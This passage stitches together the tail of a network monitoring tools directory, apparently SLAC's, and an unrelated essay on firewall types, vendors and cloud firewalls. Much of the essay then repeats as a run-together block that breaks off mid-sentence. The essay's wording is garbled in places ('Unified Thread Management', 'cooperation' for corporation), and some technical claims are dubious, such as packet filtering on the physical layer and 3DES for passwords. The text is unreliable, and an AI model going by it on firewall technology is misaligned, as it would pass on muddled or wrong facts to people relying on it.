    diagnose, and resolve network outages and performance issues. It offers 
    network-centric views that are designed to deliver the critical 
    information you need.
    




Pandora the Free Monitoring System
    is a Free Software set of programs, set under the GPL license, that 
    monitors and detects network systems using remote tests (ICMP, TCP Sweep, Network scan, 
    SNMP monitoring...), or using local agents to grab application/system datga (has agents 
    for Linux, AIX, HP-UX, Solaris and Windows XP,2000/2003). Pandora FMS is able to fire 
    alarms, draw graphs and keep event history for each element using a SQL backend
    

PathSolutions TotalView
    Root-cause troubleshooting for voice, video, and data networks.
    
Q3ADE

Reconnoiter
    is a monitoring and trend analysis system designed to cope with large architectures 
    (thousands of machines and hundreds of thousands of metrics). 
    


ScriptLogic Perspective
    addresses the problems associated with bandwidth, network and application 
    performance, and connectivity that are often  issues for IT departments.	
    Perspective supports multiple sites, is easy to use. 
    
Sentinet3
    provides  networks, applications, systems, environment and security monitoring.
    
ServersCheck
    is a web based monitoring tool for monitoring networks and servers (e.g. temperatures etc.)
    
SevOne
    provides a distributed network performance management platform that 
    delivers a scalable and comprehensive real-time monitoring, 
    troubleshooting and reporting solution that supports over 15 
    collection methodologies such as SNMP, NetFlow, ICMP, IP SLA, WMI, 
    vCenter API, XML, and JMX.
    





    Spectrum1 (ex Cabletron, then Aprisma then Concord Communications 
    then CA). Network Tool specialized in Fault Management and Root Cause Analysis 
    engine. Helps optimize MTTR and MTBF.The tool is modular in that it can also 
    monitor/manage QOS,MPLS/VPN,Multicast Network, Device Configurations.
    


StableNet
    Carrier-Grade performance management tool, built upon open standards. 
    Supports active (Ping, SAA) and passive (SNMP, RMON, NetFlow, SFlow) 
    measurements. Integrated topology/inventory, SLA/SLM, reporting.
    
Sun Solstice
Switch Center
    Network management and monitoring software using SNMP (v1-3) network devices from 
    any vendor including network discovery, logical and physical (Layer 2/3) network 
    topology mapping, performance monitoring, real-time reports and pro-active alerts.
    


SysUpTime
    is a free distributed network/systems management product. It provides 
    users out-of-box capabilities to efficiently and proactively manage 
    networks of any size.
    
Tembria
    Tembria Server Monitor is an affordable server monitoring platform with 
    deep support for Windows server monitoring plus support for Linux and 
    SNMP devices too.
    
The Dude is a free
    network monitor will automatically scan all devices within specified 
    subnets, draw and layout a map of your networks, monitor services of 
    your devices and alert you in case some service has problems.
    
TruePath Technologies
    LMS is a web based monitoring and reporting tool that focuses on carrier, 
    Metro (MEF), OAM and 1731 type monitoring.  It has a built-in end-user 
    portal and multi-threaded polling engine for fast, reliable monitoring.
    
Uptrends Infra
    is a network monitoring solution/platform. With Uptrends Infra you can monitor 
    network protocols and network devices.
    
Vallum Halo
    Manager is a web-based network monitor tool, based on GMI agent technology, suitable 
    for small networks or distributed management of many subnets, featuring continuous 
    polling of ping and GMI devices, auto-discovery, alerting, and performance metrics.
    
Verax NMS
    is a service availability and performance monitoring system supporting 
    a range of network elements (e.g. Windows and Linux hosts, ATM switches, 
    Brocade and Juniper routers, ADVA Optical Networking FSP), applications 
    (e.g. Apache Tomcat and WebSphere servers, Oracle and Microsoft SQL Server 
    databases), virtualisation (e.g. VMware vSphere) and data center devices 
    (incl. power supplies, air conditioning, sensors and detectors).
    

WhatsUp Gold
    discovers and maps your network, uses SNMP v1-3, WMI and custom scripts 
    to monitor resources and applications on your devices, notifies you via 
    email, SMS, pager, etc., when problems occur, and provides historical and 
    real-time reporting through a Windows console interface, full Web 
    interface, and mobile interface. WhatsUp Gold is available for single 
    networks and as a distributed solution for managing large, geographically 
    dispersed networks
    
ZettaView
    is a 24/7 monitoring, trend analysis, reporting, and alarm management system for LAN, 
    WAN, and ATM that stores information at a 10 second granularity on local probes.
    
Zoho Corp ManageEngine OpManager


 
    network management software.
  Zyrion Traverse
    a network, application & server monitoring platform with open API, 
    correlated views of IT "services" and integration with flow analysis tools.
    



Monitoring Tools Integrated with NMP [Contents]



Ciscoworks 


Optimal Networks. 
ScriptLogic Perspective
    has several tools including 
    
    Network Traffic Analysis,
    
    VoIP monitoring and
    
    Wireless monitoring.
  Solarwinds has several tools including: Server Application Monitor,
    NetFlow Traffic Analyzer,
    VoIP Monitor,
    Wireless
Network Monitor.  





Commercial Monitoring Tools, not integrated with an NMP [Contents]
Analyzer/Sniffer |
Application/Services/Systems monitoring 
(Hosted/managed monitoring services) | 
BGP |
Emulators |
Flow Monitoring |
FTP |
IP Address/Asset Management |
IT Search | 
Network Security tools |
SNMP Tools |
Topology/Mapping/Traceroute |
VOIP |
Video-over-IP



AlertCenter
    provides monitoring, alerting and corrective action automation scheduling. 
    It is part of the 
    MKS Toolkit.
  AlertSite
    measures, diagnoses, notifies and reports on the availability and 
    performance of servers, URLs, web applications and virtually any 
    Internet connected device or application.
    

Analyzer/Sniffers, see also public domain capture tools.
  
ACE Analyst
      from OPnet is a transactional analysis solution, based on network packet captures.
      
All-in-one Netwflow Anslyzer PRTG
      monitors your bandwidth and traffic, supports all different NetFlow versions, monitors all important flow protocols.
    Anritsu
       provide the MD1230 portable network and IP network performance monitor.
      


Anue Systems,
           makes a Net Tool Optimizer that is used to connect multiple monitoring tools to 
           a network link, or one tool to multiple links.  This is a hardware device.  
           It is similar to Gigamon.
           
APCON,
      manufactures a physical layer matrix switch to remotely move and share 
      network monitoring tools using a software interface or scripting.
      
AthTek NetWalk Enterprise Edition
      is a comprehensive network monitoring tool which is expert in packet sniffing and analyzing.
      
BGP

Border 61,
        NSI probes the available BGP transits to each available destination and then 
        enforces an outbound path based upon packet loss, delay and 
        links costs / available bandwidth.
      

Noction
        IRP actively probes remote prefixes for metrics such as packet loss, 
        latency, throughput, historical reliability and maximum peer capacity. 
        Based on these actively gathered metrics, the platform computes a 
        performance and/or a cost-based route optimization. 
        The platform then announces the improved route to the network`s 
        edge routers via a typical BGP session.

This is a volunteer, unfunded effort. This helps assure
its independence. 
Increasingly new additions are from reader suggestions/recommendations.
If you have a suggestion for adding something: 
please send an email to Cottrell at slac.stanford.edu 

making sure that you 
indicate where the tool fits in the hierarchy, provide a URL to get
more information on the tool,
and provide a short 
one sentence description of the tool's purpose with no 
marketing hyperbole.  Also if you notice out of date or incorrect links 
please report.  Thanks.

Footnotes

1When using the Chrome Browser extension for checking Links Results,
this gives an error, e.g. 403, 404, 405, 500, 503 503 503 503 503 but usually works from the browser.

2Host appeared to be down (temporarily?) last time we tested.

3Changed name.

4This is slow to load and so may appear to not exist.

5Is redirected to an alternative site, often because of a takeover.

6Site may be blocked by some site firewalls due to cybersecurity concerns.


  [
  Suggestions |
  [Contents] |
  SLAC |
  Stanford University
  ] 





  [
  Suggestions |
  [Contents] |
  SLAC |
  Stanford University
  ] 

Firewall is one of best security mechanism that monitor and control the network traffic incoming and outgoing, based on predefined security rules. The firewall is always established between trusted internal and some other outside network (can be internet), assuming that outside network unsecured and untrusted. There are mainly two kinds of firewalls, host-based firewalls and network firewalls. Some of firewall provide additional services like DHCP (Dynamic Host Configuration Protocol) or VPN (Virtual Private Network) services for the internal network. There are Three generations of firewalls named First, Second and Third. First generation firewalls were based on packet filtering. Looking at the network address (IP) and the port of the packet, it determined whether packet is to block or allowed. If a particular packet or series of packets did not match for packet filtering rules, those were simply dropped.  In 1988 first packet filter firewall was developed from Digital Equipment Firewalls. If packets do not match the rules, the filter will reject or drop the packet. These filtering works on the first three layers (physical layer, data link layer and network layer) of the OSI (Open Systems Interconnection) model.Second generation firewalls called as "stateful" filters. Between in 1989 and 1990 AT & T Bell Laboratories developed second generation firewalls named them as “circuit level gateways”. Like in first generation it is based on first three layers of OSI model but included layer four (transport layer) too. This revolution made analyzing packet until more information is used to make decision about its state. It is known as “stateful packet inspection”. This will record whole communication passing through firewall and decide whether the traffic is beginning of a new connection or part of an existing connection. Some DoS (Denial of Service) attacks can try to create millions of fake connections and then attempt fill connection state memory (Anonymous, 2005).When it comes to third generation firewall, they are known as application level firewalls. The main benefit of filtering the application layer is that determine typical applications and protocols such FTP (File Transfer Protocol), HTTP (Hyper Text Transfer Protocol) and DNS (Domain Name System). If unwanted services or applications trying to bypass the firewall using an allowed port, detect and drop the traffic. It stops protocol being abused in harmful way.  In late 2012, most awaited firewall called NGFW (Next Generation Firewall) came in to the play. It is more focused on deeper and wider inspection of application attack. It is included deep packet analysis techniques such Intrusion Prevention Systems (IPS), User Identity Management and WAF (Web Application Firewalls).In any organization in the world will not be achieved 100% security for their organization. But they can mitigate those attacks by doing the right things. Considering about most dangerous attacks currently exist in the world, DDoS (Distributed Denial of Service) attacks, ransomware and malwares will come in the first place (Kenig, 2013).Firewalls are focused on analyzing, examining and preventing one traffic at a time. To detect combining behavior of the current attacks are very hard. In the stateless protection will handle thousands of communication attacks without needing rules or table entries. Let’s consider about DDoS vector called HTTP floods. It creates billions of legitimate sessions with the server (Micro, 2015). Even if they are legitimate connections most of the Next Generation Firewall will block these kinds of attacks. Examining each individual session differentiate the malicious and un-malicious communications. Other hardest attack is backdoor attacks. It allows remote access to the device using vulnerable applications. Hackers mostly get used of these backdoor programs to take the admin privileges of internal network. Port bidding, legitimate platform abuse and calling command & control (C&C) servers to malicious payloads. Keeping firewalls in entry points (also called perimeter security) can prevent these backdoor attacks. Recently there was huge ransomware attack named “Wannacry”.  It exploited the SMB (Server Message Block) on the windows operation systems. This protocol communicates through port TCP 445. Configuring rule for preventing SMB traffic entering or leaving from the network. Make sure not to mistakenly open port 445 by lower rules. Always monitor the violations and traffic flows and deny of company security policies. Initiate rules for preventing opening of SMP ports in future (Harrison, 2017).These proxy firewalls are bit old but still use in today. It acts as a gateway from one network to another only for predefined applications. But current proxy servers may provide more additional functionalities like security and caching by mitigating direct communication from outside networks. These types of firewalls can be more expensive and less speed compared to normal firewalls.Unlike other firewalls network traffic does not flow through proxy firewall, instead that computer or device which needs to initiate a communication for outside network establishes connection with proxy and then proxy will create a new communication to outside network. Response will come to the proxy itself and then redirect the traffic to relevant device inside the network.  This mechanism will prevent direct access from untrusted outside communication (Anonymous, 2015).These firewalls well known as “traditional” firewalls. Allowing or Blocking mechanism is based on protocol, port and state of the network traffic. Firewall monitors whole communication from the beginning until it is end. Both context and administrator/Security Engineer defined rules are considered to filtering decisions. Context implies that taking information from previous traffic/packet patterns and past communications belong to the ideal connection.There can be many advantages and disadvantages as well. Those are typically faster than other available packet screening methods. Filtering is done by lower level of the ISO-OSI model. Filtering mechanism takes time to process the packet is much quicker. Those firewall types can be implemented transparently. There is no need any additional configuration for buyer or the administrator. These stateful firewalls are less expensive than the other types of firewalls. Many software packages and hardware devices already have packet filtering techniques included as a part of the standard package. There are some difficulties as well. Lack of authentication methods. Difficulties and complexity of setting up advanced packet filtering rules (Anonymous, 2015).These types of firewalls typically combine intrusion prevention, antivirus and stateful inspection firewall. It can be included cloud management and more additional services. Unified Thread Management Firewall thoroughly focus on ease of use, convenience, promises integration and simplicity. Especially valuable for enterprise use. UTM provides some additional features such application control, content filtering, spam filtering and web content filtering. These firewalls designed to fight for all levels of malicious activities on the internal network (Anonymous, 2015).Today, most of the organizations get help to block modern threads like application layer attacks and advanced malware attacks using next generation firewalls. Very powerful and more intelligence when compared to previous firewall types. But the price also little bit higher.These Next Generation Firewalls provide typical standard firewall capabilities, integrated intrusion prevention system, controlling to view and block suspicious application and provide more type of application awareness. Looking at the past malicious traffics and upgrade the rules including future information feeds. Include Secure Socket Layers (SSL), Secure Shells (SSH) inspection and deep packet inspections.All the features just like the Next Generation Firewalls but provide more additional threat detection and remediation. Identifying which set of assets are most at risk and deliver complete context awareness. Reactive and proactive awareness with intelligent and automation policies and hardens corporation defense dynamically. Analyze suspicious activities with network and end-point to better detection of evasive. Time to take the detection of attack and cleanup it greatly decreases. These firewalls provide continuously monitoring for suspicious behavior and activity after initial inspection.
Due to the user friendliness of the firewall it is very easy to administrate and even reduce complexity of the configurations. Always comes with threat detection engines which leverage both signature less technology and signature based technology (Anonymous, 2015).There are main three purposes of implement a firewall. Establish a control network and link in the organization. Secure the internal network from Internet based attacks. And last but the not least achieve a single choke point. Generally, firewall implementations are done by experienced consultants. It needs to meet all goals of placing a firewall. Whole network traffic outside to inside or vice versa must goes through the firewall. Legal traffic only distinct by the local safety analysis should be allowable to pass. The located firewall itself wants to resistant to the diffusion. When a security consultant implements a firewall plan for the organization according to these goals, organization can expect highest security (Behrouz A.).There are four general techniques that need to be follow before place a firewall.

Controlling the current services – defines the varieties of Internet services could be accessed, outbound or inbound.
Controlling user actions – determines the access control to services according to user authorization.
Controlling the directions – defined by the direction which services requests are allowed.
Controlling behavior – defined and control how the services are being used inside the organization (E.g. Electronic mails)

All the firewalls perform in two ways when it comes to functionalities.
Positive effects
Logging and Auditing
Configuring any firewall to audit and log activity, all the information can be analyzed and kept at a future day.
Authentication of users
Firewalls can be defined to ask for the end user authentication. This helps to control network associate to track and control specific user activity.
NAT (Network Address Translation) 
Hiding their true IP (Internet Protocol) addresses from devices on any side of the firewall. There can be two ways to perform that.

Many-to-one – All actual addresses are transformed to one address.
One-to-one -  All actual addresses are transformed to an unique translated address.

Anti-Spoofing – define the source of the network communication is got "spoofed".
For an example a person is trying to access a blocked site alters the source IP address inside the message, therefore all the traffic is allowed.
Negative effects
Single point of failure – most of configurations in the organizations firewalls are the only available link between network communications. If firewalls are unavailable or not configured properly, there will not be allowed any traffic go through the firewall.
Increase the management responsibilities – Firewalls make network troubleshooting more complex and add more management responsibilities.
Traffic bottlenecks – There can be a huge chance that the corporate network may become congest due to forcing all traffic pass through the firewall.
Firewalls may prevent Trojan or virus from using the Internet while on user machine.
In summary, buying a firewall and implement for the organization is daunting task. Most valuable step is preparation. There can be VPN users inside the organization. Identify them properly and doing a survey might help to get better idea. Whether the organization will have share point servers or exchange servers are needed to preconfigure before purchase a firewall.  There can be many integrated WAF (Web Application Firewalls) even. It is very help full if the organization has web applications running in-house servers. Most people do not thoroughly understand the necessity and important of the firewalls. It always considers as product for business only. If the organization network has access or communication to the outside world through Internet, then the organization needs a firewall to protect the internal network and the devices (Beal, 2010).
Additional Features of Firewalls
Most firewall companies designed their firewalls very complex and large networks. But those cost much higher. But those firewalls have faster throughput, handle many users and other advanced features.

Reporting mechanisms and dedicated monitoring.
The ability to monitor and manage multiple firewalls concurrently.
Opportunity to be extended through plugins or add on modules.
Advanced authentication mechanism.
Incorporate with VPN (Virtual Private Network) gateways.
Control access through policies and apply those policies according to the user.

Other than above mentioned features there can be more advanced features according to the subscription. 3DES (Triple Data Encryption for Symmetric key) encryption is one of extra advanced feature. It provides more complexity of key cipher for the sensitive data such as passwords. Some of brands provide free services like spam filtering, URL (Uniform Resource Locator) screening, Free Anti-virus, Reporting mechanisms and centralized management and web caching (Shinder, 2004).
Best Firewalls and their features
Palo Alto Networks Wildfire
These firewalls are developed to securely and safely allow applications and avoid modern attacks. Identifying all traffic based on users, content/devices and applications to let understand the organization policies in the form of ease of use security rules.
Focusing on superior architecture and superior benefits Palto-alto give one best firewalls in the world. There are some unique features like Automated security, protection for data and users and precise control and complete visibility. They will provide free two-hour hands on experience virtual lab. Requesting the organizations’ SLR (Security Lifecycle Review) to analyze the network and create a comprehensive report about the organization. Current newest firewalls are PA-7000 series, PA-5200 Series and PA-5000 Series.
In Palo-alto – 7000 Series there are some brilliant security features such,

IPS
APT Prevention
Passive DNS
Data Filtering Decryption
User Control & Visibility
Application control and visibility etc.

Cisco ASA
Cisco organization also have very competitive firewall technology called ASA (Adaptive Security Appliance).
In their specifications mentioned block more attacks and mitigate the network breaches. These firewall more used for data center deployments. It is to protect servers in the center from the rest of entire network. There two sides in the firewall called inside (more trusted) and outside (less trusted) zones. Both sides can be configured in different security and trust levels according to requirements. Generally large enterprise may have many data centers to protect. All the data center traffic should pass through their firewalls.
The above diagram is a good example for how to implement the basic security structure for datacenter. Each data center has a firewall placed in front of them for redundancy purposes. According to Unified Communications Solution two data centers belong to the two different clusters or same clusters (Anonymous, 2016).
Fortinet FortiGate
Fortinet also provide one of best Next-Generation Firewalls. High-performance, with multilayered security and visibility to the end to end protection for whole network. They deliver ultra-low latency and scalable performance. Fortinet provides security for the distributed branches, internal segments and data center for the lower cost. Fight against unknown and known threats to mitigate breach of sensitive data in the cooperation (Anonymous, 2017).
There features include:

Comprehensive protection and multilayered security against complex attacks and prevent single point vulnerabilities.
Demonstration of effectiveness of the security and validation of third-party involving.
SSL inspection mechanism to protect against Trojans hiding in encrypted communication.
Simplify deployment and consistent security with single pane of glass management.

pfSense
PfSense firewall addresses comprehensive information security for the large organizations. It brings together the more advanced features to create protecting the cooperate network less complex than in previously. The pfSense filters UDP and TCP network traffic according to the destination and Source IP, protocol and destination and source ports. Per rule basis it limits simultaneous connections.  Flexible routing policies possible by selecting gateway (Technical team, 2017).
pfsense got some packet normalization techniques to ensure there are no ambiguity in interpretation of destination of the packet. There are many filters functions inside the firewall but still security analysts can disable relevant filters under the acknowledgements of the consultants.
Another pfsense feature IPsec grants connectivity with whatever device supports typical IPSec. It is more use for site-to-site connectivity to installation and any other firewall brands like Juniper, Cisco. Organization can get help for mobile client’s connections as well. OpenVPN also a powerful and flexible SSL solution for wide range of operating systems. From PPPoE server can be done RADIUS authentication and optional accounting in the network.
Sophos Firewall
In Sophos firewall there are two types of firewalls free and non-free. The features include traffic shaping, monitoring & reporting, application control, IPS, VPN and URL filtering. Due to traffic shaping it is increased the bandwidth inside the network. Only prioritized application traffic internet connection gets shaped based on the predefined manner. Then the buyer can access their home network from anywhere in the world. Because strong VPN mechanism uses for the remote network monitoring as well.
The configuration for Sophos is very light weight due to their light weight platform. A server with Intel compatible and dual network interfaces by installing XG firewall home edition will do the work (Technical Team, 2016). Sophos firewall also have cloud sandbox called “Sandstorm”. It uses next-generation sandbox techniques providing the cooperation extra layer security against most of the ransomware target attacks. It comes with insight, unrivaled security and simplicity for the organization. Blocking unknown threats from suit of advanced securing IPS. Incident response by automatically and expose and mitigate hidden risks.
Future of the firewall
Introduction
In 2017 people experience this Next Generation firewalls. But what next? It is very hard to give proper forecast about future types of firewalls. Existing firewalls based on the apply app security rules to using specific ports. By protocol such SSH (Secure Shell), FTP (File Transfer Protocol), HTTP (Hyper Text Transfer Protocol) firewall filters the traffic. After 5-10 years cooperation infrastructure change to the public cloud applications such SaaS (Software as a Service). The current available best firewalls also blind to accessing unauthorized applications from users. This is known as “Shadow IT” in IT field. Other most important thing is mobile users without going through firewall they access the cloud applications. There is a new network security product called CABS (Cloud Access Security Broker) to place those equipment addresses the limitations of firewall. Mobility and cloud infrastructure could not be solved with the firewall appliance. There will be a new platform called NSaaS (Network Security as a Service).
When security consultant gets decision about placing security of the network inside the cloud it needs start with the firewall. Policy enforcement, networking and security commonly starts with site-to-site tunnel between organization location from WAN (Wide Area Network).  Websites like “Shodan” assemble IoT (Internet of Things) botnets and vulnerable devices for proceed huge attacks. Detecting attacks and threats by analyzing destination and source of the network traffic will no more possible. Phishing attacks and malicious domain come with IoT is pretty harder to defined because of the device encrypting and route DNS (Domain Name System) encryption (Dickson, 2017).
IoT with firewalls
When it comes to Internet of Things, it is always considering the cloud based firewalls. Traffic tunneling is a special effect from the cloud to see the traffic goes through the firewall even if the traffic was encrypted. From GRE Tunnels and IPSEC and double or single function tunneling for client software better to add. Cloud security for Internet of Thing devices needs to have PKI (Public Key Infrastructure) management to legitimate authorization and integrity. It has another part for device security including trusted execution atmosphere, identity certifications, and booting security. Another part is for communication security. Protection against Man-in-the-Middle-Attack (MITM), keeping message integrity, encryption and authorization.
Firewalls can be implemented as both hardware and software but need to be perform real time communication traffic inspection without having high throughput value. If it is still analyzing large number of data packet and filtering by rules there can be bottleneck as well as issues of network performances. The future firewall needs to concern illegitimate and legitimate traffic automatically to identify never-before-seen attacks and threats. When working with IoT devices firewall has to be multipurpose. Based on the current high bandwidth, these firewalls have to be 10 GB throughput per second in the next 5-10 years (Arsene, 2015).
Once the organization identified Internet of things attack surface, their devices should be divided into policy-driven areas based on the risks profile. IoT policy groups and rules needs to automatically limit or grant potential compromised devices by passing exploits and malware.
Firewalls for IaaS and PaaS
Normally part of the outsourcing the computing and the firewall services, in a lower level with IaaS (Infrastructure as a Service) on a higher-level SaaS/PaaS (Software as a Service/Platform as a Service) shift in organization security responsibility. Most of the cloud service providers are offering very default and basic security products. There are many cloud computing vendors such Rackspace (IaaS), Google (IaaS/PaaS), IBM (IaaS/PaaS) and Amazon web servers (IaaS) uses next generation firewalls like Palo-Alto for their cloud security. As well-known Amazon is the largest organization to play in the cloud computing space. IaaS has come with firewall model compatible with client VM as well.  Beyond the blocking certain ports inside the network, IaaS providers do not know which kind of ports will close or open in the future.
Both Azure and EC2 give user re-configurable firewalls around groups or instances of instances, related to as Security Groups in EC2 and Endpoints which are in Azure platform, designed to provide a very basic level of platform security. Interoperability and usability is giving evident as both are very easy to configure whilst proving better default security by blocking inbound network traffic (except Secure SHells) by default, mitigating un-secured devices being exposed to the public Internet unintentionally. In terms of buyer experience, both Azure and EC2 give very simple web interfaces for configuring, adding and removing firewall base rules. The GCE (Google Compute Engine) web interface grants the security consultant to disable or enable HTTP (Hyper Text Transfer Protocol)/ HTTPS (Hyper Text Transfer Protocol Secure) network traffic, but any further settings should be done using the downloadable Google Cloud Software Development Kit (SDK) via the kernel terminal. This method grants programmatic and scriptable control of the firewall, but creates configuration little bit more difficult for buyers who are less used to the KCLI (Kernel Command Line Interface). Both types of interface grant the similar level of configuration: firewall rules could be added to grant certain protocols and ports, and a range of allowable Internet Protocol (IP) or individual addresses can be specified. All the interfaces surveyed used IPv4 (Version 4) rather than v6 (Version 6).
Cloud Based Firewalls (Firewall as a service)
Cloud-based firewalls come in many different versions. All the cloud based firewalls are application that investigates that outgoing and incoming network or IP packets to get filtered against firewall access policies and mitigate malicious network traffic. Yet those firewalls are also quite different from other firewalls. Suppose of firewall as two essential network security techniques: Both are designed to protect the organization, cooperation's' network, and their virtual and real assets, but in different contexts in the cloud perspective. Plain-vanilla firewalls in the cloud based technology play such traditional on-premises firewall equipment except those firewalls are a service provided by organization ISP (Internet service provider) or may be a dedicated Software as a Service (SaaS) provider of firewall services that will be, a Firewall as a Service (FWaaS) provider. CIOs' organizations might pay a fixed or varied payment for these kinds of services. It is more likely if the available service is defined by local Internet Service Provider or telecom company. Apart from that, it might pay a monthly billing cycle based on several other factors, like total available bandwidth consumed and optional other services (like domain filtering) beyond strictly safe guarding for malware.
Changing settings, the FWaaS is quite straight forward. If this will be an add-on service provided by local telecom company, buyers probably do not need to change configurations or done anything else at main business location. Network Security administrators get a management or dashboard console that displays activities and may be lets them select options for what to be displayed on the screen, domains to whitelist or blacklist. With FWaaS, organization will only pay for what they use therefore, company do not have to go for more firewall appliance capability than company generally need to be prepared for their busiest time intervals. Organization has excessive on-premises firewall capacity, especially if the company has already started to migrate critical services to the trusted cloud. By turning-off specified appliances, organization is essentially outsourcing their security perimeter to a quite more efficient and effective service.
Future Enterprise Firewalls
Future firewalls always going to be as a cloud service. Because on cloud computing security has anyhow focused on the business benefits and engineering challenges of the cloud. Current studies which explicitly explain the security implementation and implications of the cloud, many research papers also consider an overview of challenges in cloud security because firewall will host inside the cloud. More at the regulatory and liability features help to surrounding moving data into the cloud with cloud security, or focus on theoretical implementation and implementations of security infrastructure of the cloud in the firewall. Work like that has showed at how firewalls may be smoothly adapted for cloud based environments, but it did not define any current implementations in comparison. Because it is too early to predict future specifications.  While discussing the cloud as a white box, those equipment aim to reveal external and internal on functionality and frequently deal with network security issues.
There can be these kinds of features in the future:

Advanced and intelligent Context-Based Firewall Security - the context-based security model will be quickly replaced with the static security infrastructure that currently exists in most administrations.
Improved Decision-Making - A context-aware solution uses data from multiple sources and could intelligently put it in the right context. This will increase firewalls to make accurate security decisions during an incident.
Better Focus, Faster Response: By filtering data based on context, firewalls could reduce the need for multiple security alerts to only a very few key vulnerabilities that represent the highest risk. This also enables reduction in response time in the future.
Sensing Advanced Terrorizations: A context-based firewall scheme is sensitive and active in its method and delivers better perceptibility and insights. Information Technology advisors will be able to simply trail what is happening on the network. This will particularly useful for thwarting next generation malware and advanced threats that are emerging in the future.
Operational Savings: Reduction in the response time, increase in more accuracy of decisions and improved focus of network security strategies will be all factors that collectively result in operational savings for the organization by using a firewall which implements context based security.

Upcoming Firewalls will be intensive on very higher-level information to develop more situationally aware and the firewalls will convert more dynamic to aware with no threat changes on the cloud, and the firewall will become more capable of segmenting the large cooperate network without disrupting machine communication. Firewalls are essential in perimeter security, they should be supplemented by internal or external threat monitoring mechanism. Instead of solely focusing on what is going to be inside in the firewall, security consultants will be started to experience the more focus with network security measures inside or outside the organization perimeter.  Implementation of Firewall will change in the future. Human configuration will long the only way to tune a firewall. But machine learning will be enabled future firewalls to take on hackers and attackers more proactively.
All the firewalls perform in two ways when it comes to functionalities.Logging and AuditingConfiguring any firewall to audit and log activity, all the information can be analyzed and kept at a future day.Firewalls can be defined to ask for the end user authentication. This helps to control network associate to track and control specific user activity.NAT (Network Address Translation) Hiding their true IP (Internet Protocol) addresses from devices on any side of the firewall. There can be two ways to perform that.Anti-Spoofing – define the source of the network communication is got "spoofed".For an example a person is trying to access a blocked site alters the source IP address inside the message, therefore all the traffic is allowed.Single point of failure – most of configurations in the organizations firewalls are the only available link between network communications. If firewalls are unavailable or not configured properly, there will not be allowed any traffic go through the firewall.Increase the management responsibilities – Firewalls make network troubleshooting more complex and add more management responsibilities.Traffic bottlenecks – There can be a huge chance that the corporate network may become congest due to forcing all traffic pass through the firewall.Firewalls may prevent Trojan or virus from using the Internet while on user machine.In summary, buying a firewall and implement for the organization is daunting task. Most valuable step is preparation. There can be VPN users inside the organization. Identify them properly and doing a survey might help to get better idea. Whether the organization will have share point servers or exchange servers are needed to preconfigure before purchase a firewall.  There can be many integrated WAF (Web Application Firewalls) even. It is very help full if the organization has web applications running in-house servers. Most people do not thoroughly understand the necessity and important of the firewalls. It always considers as product for business only. If the organization network has access or communication to the outside world through Internet, then the organization needs a firewall to protect the internal network and the devices (Beal, 2010).Most firewall companies designed their firewalls very complex and large networks. But those cost much higher. But those firewalls have faster throughput, handle many users and other advanced features.Other than above mentioned features there can be more advanced features according to the subscription. 3DES (Triple Data Encryption for Symmetric key) encryption is one of extra advanced feature. It provides more complexity of key cipher for the sensitive data such as passwords. Some of brands provide free services like spam filtering, URL (Uniform Resource Locator) screening, Free Anti-virus, Reporting mechanisms and centralized management and web caching (Shinder, 2004).These firewalls are developed to securely and safely allow applications and avoid modern attacks. Identifying all traffic based on users, content/devices and applications to let understand the organization policies in the form of ease of use security rules.Focusing on superior architecture and superior benefits Palto-alto give one best firewalls in the world. There are some unique features like Automated security, protection for data and users and precise control and complete visibility. They will provide free two-hour hands on experience virtual lab. Requesting the organizations’ SLR (Security Lifecycle Review) to analyze the network and create a comprehensive report about the organization. Current newest firewalls are PA-7000 series, PA-5200 Series and PA-5000 Series.In Palo-alto – 7000 Series there are some brilliant security features such,Cisco organization also have very competitive firewall technology called ASA (Adaptive Security Appliance).In their specifications mentioned block more attacks and mitigate the network breaches. These firewall more used for data center deployments. It is to protect servers in the center from the rest of entire network. There two sides in the firewall called inside (more trusted) and outside (less trusted) zones. Both sides can be configured in different security and trust levels according to requirements. Generally large enterprise may have many data centers to protect. All the data center traffic should pass through their firewalls.The above diagram is a good example for how to implement the basic security structure for datacenter. Each data center has a firewall placed in front of them for redundancy purposes. According to Unified Communications Solution two data centers belong to the two different clusters or same clusters (Anonymous, 2016).Fortinet also provide one of best Next-Generation Firewalls. High-performance, with multilayered security and visibility to the end to end protection for whole network. They deliver ultra-low latency and scalable performance. Fortinet provides security for the distributed branches, internal segments and data center for the lower cost. Fight against unknown and known threats to mitigate breach of sensitive data in the cooperation (Anonymous, 2017).There features include:PfSense firewall addresses comprehensive information security for the large organizations. It brings together the more advanced features to create protecting the cooperate network less complex than in previously. The pfSense filters UDP and TCP network traffic according to the destination and Source IP, protocol and destination and source ports. Per rule basis it limits simultaneous connections.  Flexible routing policies possible by selecting gateway (Technical team, 2017).pfsense got some packet normalization techniques to ensure there are no ambiguity in interpretation of destination of the packet. There are many filters functions inside the firewall but still security analysts can disable relevant filters under the acknowledgements of the consultants.Another pfsense feature IPsec grants connectivity with whatever device supports typical IPSec. It is more use for site-to-site connectivity to installation and any other firewall brands like Juniper, Cisco. Organization can get help for mobile client’s connections as well. OpenVPN also a powerful and flexible SSL solution for wide range of operating systems. From PPPoE server can be done RADIUS authentication and optional accounting in the network.In Sophos firewall there are two types of firewalls free and non-free. The features include traffic shaping, monitoring & reporting, application control, IPS, VPN and URL filtering. Due to traffic shaping it is increased the bandwidth inside the network. Only prioritized application traffic internet connection gets shaped based on the predefined manner. Then the buyer can access their home network from anywhere in the world. Because strong VPN mechanism uses for the remote network monitoring as well.The configuration for Sophos is very light weight due to their light weight platform. A server with Intel compatible and dual network interfaces by installing XG firewall home edition will do the work (Technical Team, 2016). Sophos firewall also have cloud sandbox called “Sandstorm”. It uses next-generation sandbox techniques providing the cooperation extra layer security against most of the ransomware target attacks. It comes with insight, unrivaled security and simplicity for the organization. Blocking unknown threats from suit of advanced securing IPS. Incident response by automatically and expose and mitigate hidden risks.In 2017 people experience this Next Generation firewalls. But what next? It is very hard to give proper forecast about future types of firewalls. Existing firewalls based on the apply app security rules to using specific ports. By protocol such SSH (Secure Shell), FTP (File Transfer Protocol), HTTP (Hyper Text Transfer Protocol) firewall filters the traffic. After 5-10 years cooperation infrastructure change to the public cloud applications such SaaS (Software as a Service). The current available best firewalls also blind to accessing unauthorized applications from users. This is known as “Shadow IT” in IT field. Other most important thing is mobile users without going through firewall they access the cloud applications. There is a new network security product called CABS (Cloud Access Security Broker) to place those equipment addresses the limitations of firewall. Mobility and cloud infrastructure could not be solved with the firewall appliance. There will be a new platform called NSaaS (Network Security as a Service).When security consultant gets decision about placing security of the network inside the cloud it needs start with the firewall. Policy enforcement, networking and security commonly starts with site-to-site tunnel between organization 